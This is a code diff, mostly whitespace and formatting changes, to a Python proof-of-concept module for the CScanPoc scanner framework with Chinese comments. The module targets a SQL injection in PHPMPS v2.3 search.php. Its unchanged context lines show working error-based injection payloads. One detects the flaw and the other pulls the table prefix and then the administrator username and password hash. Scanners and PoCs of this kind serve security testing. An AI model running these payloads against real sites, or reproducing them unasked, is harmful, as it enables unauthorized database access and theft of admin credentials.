@@ -5,11 +5,12 @@ from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 import urllib2
 
+
 class Vuln(ABVuln):
-    vuln_id = 'PHPMPS_0001' # 平台漏洞编号，留空
+    vuln_id = 'PHPMPS_0001'  # 平台漏洞编号，留空
     name = 'PHPMPS v2.3 /search.php SQL注入'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.INJECTION # 漏洞类型
+    type = VulnType.INJECTION  # 漏洞类型
     disclosure_date = '2014-10-06'  # 漏洞公布时间
     desc = '''
         PHPMPS 在修复漏洞时误将修复代码注释，造成 SQL 注入漏洞，可以获取管理员账号密码等。
@@ -19,6 +20,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = 'PHPMPS'  # 漏洞应用名称
     product_version = 'v2.3'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '0ea959ea-6532-4707-8618-c0a1aae14188'
@@ -32,7 +34,7 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
+
             payload = '/search.php?custom[xss%27)%20AND%20(SELECT%208734%20FROM(SELECT%2' \
                       '0COUNT(*),CONCAT(md5(1364124124),FLOOR(RAND(0)*2))x%20FROM%20INFO' \
                       'RMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1'
@@ -41,8 +43,8 @@ class Poc(ABPoc):
             content = urllib2.urlopen(req).read()
 
             if '1be92ddcc609c5e29f6265e9ee18f4f1' in content:
-                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
-                        target=self.target, name=self.vuln.name))
+                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
+                    target=self.target, name=self.vuln.name))
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
@@ -52,7 +54,8 @@ class Poc(ABPoc):
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
 
-            match_table_pre = re.compile('AS num FROM ([\w\d]+)_cus_value WHERE 0')
+            match_table_pre = re.compile(
+                'AS num FROM ([\w\d]+)_cus_value WHERE 0')
             match_result = re.compile('Duplicate entry \'(.*):([\w\d]{32})1\'')
             # 1
             payload = '/search.php?custom[xss%27)%20AND%20(SELECT%208734%20FROM(SELECT%2' \
@@ -65,7 +68,8 @@ class Poc(ABPoc):
             payload = '/search.php?custom[xss%27)%20AND%20(SELECT%208734%20FROM(SELECT%20' \
                       'COUNT(*),CONCAT((select%20concat(username,0x3a,password)%20from%20' \
                       '{0}_admin%20limit%201),FLOOR(RAND(0)*2))x%20FROM%20INFORMATION_SCH' \
-                      'EMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1'.format(table_pre)
+                      'EMA.CHARACTER_SETS%20GROUP%20BY%20x)a)%23]=1'.format(
+                          table_pre)
             response = requests.get(self.target + payload).content
             username, password = match_result.findall(response)[0]
 
@@ -79,6 +83,7 @@ class Poc(ABPoc):
 
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
+
 
 if __name__ == '__main__':
     Poc().run()
